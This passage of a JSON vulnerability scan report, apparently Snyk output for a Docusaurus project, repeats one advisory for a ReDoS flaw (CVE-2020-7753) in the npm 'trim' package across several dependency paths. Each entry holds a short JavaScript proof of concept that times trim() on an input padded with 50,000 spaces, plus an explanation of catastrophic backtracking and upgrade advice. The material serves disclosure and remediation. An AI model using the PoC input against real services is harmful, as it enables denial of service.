down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-sitemap@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
